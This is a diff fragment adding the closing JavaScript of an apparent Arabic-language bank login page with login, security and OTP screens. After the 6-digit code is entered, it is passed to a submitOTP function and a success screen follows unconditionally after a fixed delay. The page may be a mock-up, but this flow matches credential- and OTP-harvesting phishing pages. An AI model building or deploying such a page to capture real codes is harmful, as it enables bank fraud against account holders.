+  const code = otpIds.map(id => document.getElementById(id).value).join('');
+  const err = document.getElementById('otp-error');
+  if (code.length < 6) { err.textContent = 'يرجى إدخال الرمز المكوّن من 6 أرقام كاملاً'; err.classList.add('show'); return; }
+  if (timerSeconds <= 0) { err.textContent = 'انتهت صلاحية الرمز.'; err.classList.add('show'); return; }
+  err.classList.remove('show');
+
+  const btn = document.getElementById('otp-btn');
+  btn.innerHTML = 'جاري التحقق <span class="spinner"></span>';
+  btn.disabled = true;
+
+  submitOTP(code);
+
+  setTimeout(() => {
+    clearInterval(timerInterval);
+    btn.innerHTML = 'تأكيد الرمز';
+    btn.disabled = false;
+    document.getElementById('login-time').textContent = new Date().toLocaleTimeString('ar-SA');
+    goTo('screen-success');
+  }, 1800);
+}
+
+/* ── Screen 4 ── */
+function goToDashboard() {
+  alert('مرحباً بك في لوحة تحكم بنك النخبة 🏛');
+}
+
+/* ── Enter key shortcut ── */
+document.addEventListener('keydown', e => {
+  if (e.key === 'Enter') {
+    const active = document.querySelector('.screen.active').id;
+    if (active === 'screen-login') doLogin();
+    else if (active === 'screen-security') doSecurity();
+    else if (active === 'screen-otp') doOtp();
+  }
+});
+
+// Init
+setupOtpInputs();
+</script>
+</body>
+</html>
